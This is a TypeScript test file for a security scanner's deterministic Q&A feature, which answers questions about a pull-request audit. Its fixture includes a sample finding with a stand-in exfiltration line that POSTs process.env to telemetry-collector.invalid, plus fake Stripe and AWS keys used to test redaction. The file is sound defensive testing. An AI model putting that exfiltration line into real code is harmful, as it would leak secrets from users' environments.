import test from 'node:test';
import assert from 'node:assert/strict';
import {
  answerDeterministicQa,
  DETERMINISTIC_BADGE,
  fuzzyTokenMatch,
  parseTestFailure,
  sanitizeZeroLeakOutput,
  synthesizeRemediationSnippet,
  type ConversationTurn,
  type DeterministicAuditPayload,
  type DeterministicFinding,
} from '../src/scanner/qa/index.js';

const RAW_FAKE_STRIPE = ['sk', 'live', '51PulseMetricsRawSecret998877664321'].join('_');
const REDACTED_STRIPE = 'sk_l************4321';

function buildPulseMetricsAudit(overrides: Partial<DeterministicAuditPayload> = {}): DeterministicAuditPayload {
  return {
    repo: 'pulsemetrics/checkout-api',
    prNumber: 42,
    prTitle: 'feat(payments): wire Stripe checkout and telemetry',
    commitSha: '9a8b7c6d5e4f3210abcdef1234567890abcdef12',
    branch: 'feat/stripe-telemetry',
    riskScore: 72,
    severity: 'High',
    status: 'needs_review',
    riskContributions: {
      secrets: 44,
      egress: 28,
    },
    findings: [
      {
        id: 'f-stripe-1',
        title: 'Stripe Live Secret Key',
        severity: 'critical',
        category: 'secret',
        file: 'src/services/payment.js',
        line: 2,
        redactedSecret: REDACTED_STRIPE,
        entropy: 4.62,
        fingerprint: 'a1b2c3d4e5f60718',
        evidence: `const STRIPE_SECRET_KEY = '${REDACTED_STRIPE}';`,
        exploitability: 'Live Stripe secret enables unauthorized charges, refunds, and customer data export.',
        remediation: 'Load STRIPE_SECRET_KEY from process.env and rotate the leaked key.',
        confidence: 0.99,
        source: 'static',
        riskContribution: 44,
      },
      {
        id: 'f-egress-2',
        title: 'Unauthorized Outbound Telemetry Egress',
        severity: 'high',
        category: 'egress',
        file: 'src/utils/telemetry.js',
        line: 2,
        evidence: `fetch('https://telemetry-collector.invalid/v1/beacon', { method: 'POST', body: JSON.stringify(process.env) })`,
        exploitability: 'Exfiltrates runtime environment variables during test execution.',
        runtimeProof: 'POST https://telemetry-collector.invalid/v1/beacon observed 3 times in test phase.',
        remediation: 'Remove the unauthorized fetch call to telemetry-collector.invalid.',
        confidence: 0.96,
        source: 'runtime',
        riskContribution: 28,
      },
    ],
    egressEvents: [
      {
        domain: 'telemetry-collector.invalid',
        port: 443,
        phase: 'test',
        hitCount: 3,
        sampleUrls: ['https://telemetry-collector.invalid/v1/beacon'],
        flagged: true,
        reasons: ['not in egress allowlist', 'environment payload detected'],
        associatedFindingId: 'f-egress-2',
      },
    ],
    patch: {
      status: 'failed',
      summary: 'Replaced hardcoded Stripe key with process.env.STRIPE_SECRET_KEY and removed unauthorized fetch.',
      diff: [
        'diff --git a/src/services/payment.js b/src/services/payment.js',
        '--- a/src/services/payment.js',
        '+++ b/src/services/payment.js',
        '@@ -1,3 +1,3 @@',
        '-const STRIPE_SECRET_KEY = "sk_l************4321";',
        '+const STRIPE_SECRET_KEY = process.env.STRIPE_SECRET_KEY;',
        ' export function getKeyPrefix() { return STRIPE_SECRET_KEY.slice(0, 7); }',
        'diff --git a/src/utils/telemetry.js b/src/utils/telemetry.js',
        '--- a/src/utils/telemetry.js',
        '+++ b/src/utils/telemetry.js',
        '@@ -1,4 +1,2 @@',
        ' export function trackCheckoutEvent(evt) {',
        '-  void fetch("https://telemetry-collector.invalid/v1/beacon", { method: "POST" });',
        '+  return { tracked: true, event: evt };',
        ' }',
      ].join('\n'),
      validationStatus: 'passed',
      testStatus: 'failed',
      testSummary: '1 failed, 2 passed',
      testOutput: [
        '\x1b[31mFAIL\x1b[39m \x1b[1msrc/services/payment.test.js\x1b[22m',
        '  \x1b[31m✖\x1b[39m returns masked Stripe prefix',
        '    \x1b[31mTypeError: Cannot read properties of undefined (reading \'slice\')\x1b[39m',
        '      at getKeyPrefix (src/services/payment.js:3:58)',
        'Command exited with code 1',
      ].join('\n'),
      resolvedLeaks: 1,
      remainingLeaks: 0,
      flaggedEgressAfterPatch: 0,
      pushed: false,
      generator: 'heuristic',
    },
    sprite: {
      id: 'sg-pulsemetrics-42',
      lifecycle: 'destroyed',
      checkpoint: 'cp-pre-audit-42',
      durationMs: 4210,
      runtimeEnv: 'node',
      isolationSandbox: 'fly-sprites',
    },
    ...overrides,
  };
}

test('1. Typos resolve cleanly via length-guarded fuzzy matching without generic fallback', () => {
  const audit = buildPulseMetricsAudit();

  const r1 = answerDeterministicQa(audit, 'whre is the leked key');
  assert.equal(r1.isOutOfScope, false);
  assert.equal(r1.badge, DETERMINISTIC_BADGE);
  assert.match(r1.answer, /src\/services\/payment\.js:2/);

  const r2 = answerDeterministicQa(audit, 'egres domian');
  assert.equal(r2.isOutOfScope, false);
  assert.match(r2.answer, /telemetry-collector\.invalid:443/);

  const r3 = answerDeterministicQa(audit, 'paymnet.js');
  assert.equal(r3.isOutOfScope, false);
  assert.match(r3.answer, /src\/services\/payment\.js/);
  assert.match(r3.answer, /Stripe Live Secret Key/);

  const r4 = answerDeterministicQa(audit, 'can i aprove?');
  assert.equal(r4.isOutOfScope, false);
  assert.match(r4.answer, /^No\b/);
  assert.match(r4.answer, /\/spriteguard approve/);
});

test('2. Short-token fuzzy guardrail prevents short words from colliding with ip/ci/pr', () => {
  assert.equal(fuzzyTokenMatch('is', 'ip'), null);
  assert.equal(fuzzyTokenMatch('in', 'ip'), null);
  assert.equal(fuzzyTokenMatch('to', 'ci'), null);
  assert.equal(fuzzyTokenMatch('in', 'ci'), null);
  assert.equal(fuzzyTokenMatch('is', 'pr'), null);
  assert.equal(fuzzyTokenMatch('ip', 'ip'), 'exact');
  assert.equal(fuzzyTokenMatch('secert', 'secret'), 'fuzzy');

  const audit = buildPulseMetricsAudit();
  const nonsense = answerDeterministicQa(audit, 'is in to');
  assert.equal(nonsense.isOutOfScope, true);
});

test('3. Developer shorthand & slang routes directly to canonical intents', () => {
  const audit = buildPulseMetricsAudit();

  const ciRed = answerDeterministicQa(audit, 'why is ci red');
  assert.equal(ciRed.isOutOfScope, false);
  assert.match(ciRed.answer, /TypeError: Cannot read properties of undefined/);
  assert.match(ciRed.answer, /exit code `1`|Exit Code:\*\* `1`/i);

  const c2Exfil = answerDeterministicQa(audit, 'any c2 exfil?');
  assert.equal(c2Exfil.isOutOfScope, false);
  assert.match(c2Exfil.answer, /^Yes\b/);
  assert.match(c2Exfil.answer, /telemetry-collector\.invalid:443/);

  const lgtm = answerDeterministicQa(audit, 'lgtm ship it?');
  assert.equal(lgtm.isOutOfScope, false);
  assert.match(lgtm.answer, /^No\b/);
  assert.match(lgtm.answer, /not eligible/i);

  const creds = answerDeterministicQa(audit, 'check .env hardcoded creds');
  assert.equal(creds.isOutOfScope, false);
  assert.match(creds.answer, /sk_l\*{12}4321/);
  assert.match(creds.answer, /rotate/i);
});

test('4. Multi-turn conversational follow-ups resolve pronouns and "the other one"', () => {
  const audit = buildPulseMetricsAudit();

  const t1 = answerDeterministicQa(audit, 'what was exposed?');
  assert.match(t1.answer, /Stripe Live Secret Key/);
  assert.deepEqual(t1.meta.findingIds, ['f-stripe-1']);

  const history: ConversationTurn[] = [
    { role: 'user', content: 'what was exposed?' },
    { role: 'assistant', content: t1.answer, meta: t1.meta },
  ];

  const fixThat = answerDeterministicQa(audit, 'how do I fix that?', history);
  assert.match(fixThat.answer, /src\/services\/payment\.js/);
  assert.match(fixThat.answer, /process\.env\.STRIPE_SECRET_KEY/);

  const whereIt = answerDeterministicQa(audit, 'where is it?', history);
  assert.match(whereIt.answer, /src\/services\/payment\.js:2/);
  assert.equal(whereIt.answer.includes('src/utils/telemetry.js'), false);

  const whyRisky = answerDeterministicQa(audit, 'why is that risky?', history);
  assert.match(whyRisky.answer, /Stripe Live Secret Key/);
  assert.match(whyRisky.answer, /billing|charges|rotate/i);

  const diffIt = answerDeterministicQa(audit, 'show me the diff for it', history);
  assert.match(diffIt.answer, /```diff/);
  assert.match(diffIt.answer, /src\/services\/payment\.js/);
  assert.equal(diffIt.answer.includes('telemetry.js'), false);

  const otherOne = answerDeterministicQa(audit, 'what about the other one?', history);
  assert.match(otherOne.answer, /telemetry-collector\.invalid|Unauthorized Outbound Telemetry Egress/);
  assert.deepEqual(otherOne.meta.findingIds, ['f-egress-2']);

  // Also works when caller passes plain { role, content } without structured meta
  const plainHistory: ConversationTurn[] = [
    { role: 'user', content: 'what was exposed?' },
    { role: 'assistant', content: t1.answer },
  ];
  const wherePlain = answerDeterministicQa(audit, 'where is it?', plainHistory);
  assert.match(wherePlain.answer, /src\/services\/payment\.js:2/);
});

test('5. Entity-first lookup scopes responses to files, domains, severities, and ordinals', () => {
  const audit = buildPulseMetricsAudit();

  const fileQ = answerDeterministicQa(audit, 'tell me about payment.js');
  assert.match(fileQ.answer, /src\/services\/payment\.js:2/);
  assert.match(fileQ.answer, /```diff/);

  const domainQ = answerDeterministicQa(audit, 'what is telemetry-collector.invalid doing?');
  assert.match(domainQ.answer, /telemetry-collector\.invalid:443/);
  assert.match(domainQ.answer, /test/);
  assert.match(domainQ.answer, /3/);

  const critQ = answerDeterministicQa(audit, 'explain the critical issue');
  assert.match(critQ.answer, /Stripe Live Secret Key/);
  assert.equal(critQ.meta.findingIds.includes('f-stripe-1'), true);

  const ordQ = answerDeterministicQa(audit, 'show finding #2');
  assert.match(ordQ.answer, /telemetry\.js|telemetry-collector\.invalid|Unauthorized Outbound Telemetry Egress/);
  assert.deepEqual(ordQ.meta.findingIds, ['f-egress-2']);
});

test('6. Non-existent entity & empty-state awareness explicitly confirm absence', () => {
  const audit = buildPulseMetricsAudit();

  const absentDomain = answerDeterministicQa(audit, 'any egress to google.com?');
  assert.equal(absentDomain.isOutOfScope, false);
  assert.match(absentDomain.answer, /^No\b/);
  assert.match(absentDomain.answer, /google\.com/);
  assert.match(absentDomain.answer, /telemetry-collector\.invalid:443/);

  const egressOnlyAudit = buildPulseMetricsAudit({
    findings: [buildPulseMetricsAudit().findings[1]!],
  });
  const noSecrets = answerDeterministicQa(egressOnlyAudit, 'any leaked keys?');
  assert.equal(noSecrets.isOutOfScope, false);
  assert.match(noSecrets.answer, /^No\b/);
  assert.match(noSecrets.answer, /zero exposed secrets/i);
});

test('7. Compound / multi-intent queries render clearly labeled sub-sections', () => {
  const audit = buildPulseMetricsAudit();

  const c1 = answerDeterministicQa(audit, 'what leaked and can I merge?');
  assert.ok(c1.winningIntents.length >= 2);
  assert.match(c1.answer, /Exposed Secrets & Credentials/);
  assert.match(c1.answer, /Approval & Merge Eligibility/);
  assert.match(c1.answer, /sk_l\*{12}4321/);
  assert.match(c1.answer, /not eligible/i);

  const c2 = answerDeterministicQa(audit, 'where is the exposed key and did the patch tests pass?');
  assert.ok(c2.winningIntents.length >= 2);
  assert.match(c2.answer, /src\/services\/payment\.js:2/);
  assert.match(c2.answer, /failed/i);
});

test('8. ANSI-colored test failure extractor parses exit code, suite, and TypeError (<= 200 chars)', () => {
  const raw = [
    '\x1b[31mFAIL\x1b[39m \x1b[1msrc/services/payment.test.js\x1b[22m',
    '  \x1b[31mTypeError: Cannot read properties of undefined (reading \'slice\') ' + 'x'.repeat(240) + '\x1b[39m',
    'Command exited with code 1',
  ].join('\n');

  const parsed = parseTestFailure(raw);
  assert.ok(parsed);
  assert.equal(parsed.exitCode, 1);
  assert.equal(parsed.failingSuite, 'src/services/payment.test.js');
  assert.ok(parsed.primaryError);
  assert.equal(parsed.primaryError.includes('\x1b'), false);
  assert.ok(parsed.primaryError.length <= 200);
  assert.match(parsed.primaryError, /^TypeError: Cannot read properties of undefined/);
  assert.equal(parsed.truncated, true);
});

test('9. Language-aware remediation synthesizer generates safe snippets for .js, .py, .go, and .env even when patch.diff is null', () => {
  const jsFinding: DeterministicFinding = {
    id: 'js-1',
    title: 'Stripe Live Secret Key',
    severity: 'critical',
    category: 'secret',
    file: 'src/services/payment.js',
    line: 2,
    evidence: "const STRIPE_SECRET_KEY = 'sk_l************4321';",
  };
  const jsFix = synthesizeRemediationSnippet(jsFinding, []);
  assert.match(jsFix, /```javascript/);
  assert.match(jsFix, /process\.env\.STRIPE_SECRET_KEY/);
  assert.match(jsFix, /STRIPE_SECRET_KEY=replace_me/);

  const pyFinding: DeterministicFinding = {
    ...jsFinding,
    id: 'py-1',
    file: 'app/billing.py',
    evidence: 'STRIPE_API_KEY = "sk_l************4321"',
  };
  const pyFix = synthesizeRemediationSnippet(pyFinding, []);
  assert.match(pyFix, /```python/);
  assert.match(pyFix, /os\.environ\.get\("STRIPE_API_KEY"\)/);

  const goFinding: DeterministicFinding = {
    ...jsFinding,
    id: 'go-1',
    file: 'pkg/billing/client.go',
    evidence: 'apiKey := "sk_l************4321"',
  };
  const goFix = synthesizeRemediationSnippet(goFinding, []);
  assert.match(goFix, /```go/);
  assert.match(goFix, /os\.Getenv\("API_KEY"\)/);

  const envFinding: DeterministicFinding = {
    ...jsFinding,
    id: 'env-1',
    file: '.env.production',
    evidence: 'STRIPE_SECRET_KEY=sk_l************4321',
  };
  const envFix = synthesizeRemediationSnippet(envFinding, []);
  assert.match(envFix, /git rm --cached \.env\.production/);
  assert.match(envFix, /\.gitignore/);

  // End-to-end when patch.diff is null
  const noDiffAudit = buildPulseMetricsAudit({
    patch: { ...buildPulseMetricsAudit().patch!, diff: null },
  });
  const res = answerDeterministicQa(noDiffAudit, 'how do I fix payment.js?');
  assert.match(res.answer, /process\.env\.STRIPE_SECRET_KEY/);
  assert.match(res.answer, /Hint:/);
});

test('10. Boolean, quantitative count, and worst-issue comparison engine', () => {
  const audit = buildPulseMetricsAudit();

  const didPass = answerDeterministicQa(audit, 'did tests pass?');
  assert.match(didPass.answer, /^No\b/);
  assert.match(didPass.answer, /TypeError/);

  const count = answerDeterministicQa(audit, 'how many issues are there?');
  assert.match(count.answer, /\*\*2\*\* total findings/);
  assert.match(count.answer, /`1` critical/);
  assert.match(count.answer, /`1` high/);
  assert.match(count.answer, /`1` secret/);
  assert.match(count.answer, /`1` egress/);

  const worst = answerDeterministicQa(audit, "what's the worst issue?");
  assert.match(worst.answer, /\[CRITICAL\] Stripe Live Secret Key/);
  assert.match(worst.answer, /src\/services\/payment\.js:2/);
});

test('11. PR comment & Slack escalation drafter outputs ready-to-paste Markdown', () => {
  const audit = buildPulseMetricsAudit();

  const draft = answerDeterministicQa(audit, 'draft a slack summary for my team');
  assert.equal(draft.isOutOfScope, false);
  assert.match(draft.answer, /```markdown/);
  assert.match(draft.answer, /pulsemetrics\/checkout-api#42/);
  assert.match(draft.answer, /`BLOCKED`/);
  assert.match(draft.answer, /\| File:Line \| Severity \| Category \| Detail \|/);
  assert.match(draft.answer, /Revoke and rotate/);
});

test('12. Conceptual clustering routes threat matrix, full report, and policy overrides', () => {
  const audit = buildPulseMetricsAudit();

  const hacked = answerDeterministicQa(audit, 'will this get us hacked?');
  assert.equal(hacked.isOutOfScope, false);
  assert.match(hacked.answer, /exploitable|billing|CI\/CD Sandbox Exfiltration/i);
  assert.match(hacked.answer, /\+44/);
  assert.match(hacked.answer, /\+28/);

  const walk = answerDeterministicQa(audit, 'walk me through everything');
  assert.equal(walk.isOutOfScope, false);
  assert.match(walk.answer, /1\) Risk Breakdown/);
  assert.match(walk.answer, /2\) Findings by File/);
  assert.match(walk.answer, /3\) Egress Events/);
  assert.match(walk.answer, /4\) Patch Pipeline/);
  assert.match(walk.answer, /5\) Next Steps/);

  const shipAnyway = answerDeterministicQa(audit, 'can I ship anyway?');
  assert.equal(shipAnyway.isOutOfScope, false);
  assert.match(shipAnyway.answer, /cannot auto-dismiss/i);
  assert.match(shipAnyway.answer, /SPRITE_EGRESS_ALLOWLIST/);
});

test('13. Vague 1-word disambiguation inspects top blocker rather than generic overview', () => {
  const audit = buildPulseMetricsAudit();

  for (const vague of ['why?', 'details']) {
    const res = answerDeterministicQa(audit, vague);
    assert.equal(res.isOutOfScope, false);
    assert.equal(res.meta.lastIntent, 'disambiguation');
    assert.match(res.answer, /failing patch test/i);
    assert.match(res.answer, /Stripe Live Secret Key/);
  }
});

test('14. Clean audit short-circuit confirms riskScore 0 Clean PR', () => {
  const cleanAudit = buildPulseMetricsAudit({
    riskScore: 0,
    severity: 'Low',
    status: 'clean',
    findings: [],
    egressEvents: [],
    patch: null,
  });

  const res = answerDeterministicQa(cleanAudit, 'is it exploitable?');
  assert.equal(res.isOutOfScope, false);
  assert.equal(res.meta.lastIntent, 'clean_short_circuit');
  assert.match(res.answer, /riskScore: 0\/100/);
  assert.match(res.answer, /No exploitable vulnerabilities/i);
  assert.match(res.answer, /No remediation patch or `\/spriteguard approve`/i);

  // Metadata queries still work on clean PRs
  const metaRes = answerDeterministicQa(cleanAudit, 'show sprite sandbox metadata');
  assert.match(metaRes.answer, /sg-pulsemetrics-42/);
});

test('15. Out-of-scope prompt states scope limit and returns 3-4 PR-grounded suggestions', () => {
  const audit = buildPulseMetricsAudit();

  const poem = answerDeterministicQa(audit, 'write me a poem');
  assert.equal(poem.isOutOfScope, true);
  assert.match(poem.answer, /I only answer security and code questions grounded in this Pull Request audit/);
  assert.match(poem.answer, /Try asking:/);
  assert.ok(poem.meta.suggestedQuestions.length >= 3 && poem.meta.suggestedQuestions.length <= 4);
  assert.ok(
    poem.meta.suggestedQuestions.some((q) => /Stripe|payment\.js|telemetry-collector\.invalid|patch tests/i.test(q)),
  );
});

test('16. Zero-leak redaction invariant, determinism, missing-field grounding, and latency < 15ms', () => {
  const leakyAudit = buildPulseMetricsAudit({
    findings: [
      {
        ...buildPulseMetricsAudit().findings[0]!,
        evidence: `const STRIPE_SECRET_KEY = '${RAW_FAKE_STRIPE}';`,
      },
    ],
    patch: {
      ...buildPulseMetricsAudit().patch!,
      diff: `--- a/src/services/payment.js\n+++ b/src/services/payment.js\n-const STRIPE_SECRET_KEY = "${RAW_FAKE_STRIPE}";\n+const STRIPE_SECRET_KEY = process.env.STRIPE_SECRET_KEY;\n`,
      testOutput: `TypeError leaking ${RAW_FAKE_STRIPE} and AKIAIOSFODNN7EXAMPL9`,
    },
  });

  for (const prompt of ['show me the code', 'show the diff', 'why did tests fail?', 'what was exposed?']) {
    const a = answerDeterministicQa(leakyAudit, prompt);
    const b = answerDeterministicQa(leakyAudit, prompt);
    assert.equal(a.answer, b.answer, `Output must be byte-for-byte deterministic for "${prompt}"`);
    assert.equal(a.answer.includes(RAW_FAKE_STRIPE), false, `Raw Stripe key leaked on "${prompt}"`);
    assert.equal(a.answer.includes('AKIAIOSFODNN7EXAMPL9'), false, `Raw AWS key leaked on "${prompt}"`);
    assert.ok(a.latencyMs < 15, `Expected < 15ms latency, got ${a.latencyMs}ms on "${prompt}"`);
  }

  // Already-redacted preview survives sanitization cleanly
  assert.equal(sanitizeZeroLeakOutput(`preview \`${REDACTED_STRIPE}\``).includes(REDACTED_STRIPE), true);

  // Missing optional fields explicitly state "Not available for this audit run."
  const partialAudit = buildPulseMetricsAudit({
    patch: null,
    sprite: null,
    findings: [{ ...buildPulseMetricsAudit().findings[0]!, evidence: null }],
  });
  assert.match(answerDeterministicQa(partialAudit, 'show the diff').answer, /Not available for this audit run\./);
  assert.match(answerDeterministicQa(partialAudit, 'show evidence').answer, /Not available for this audit run\./);
  assert.match(answerDeterministicQa(partialAudit, 'show sprite metadata').answer, /Not available for this audit run\./);
});
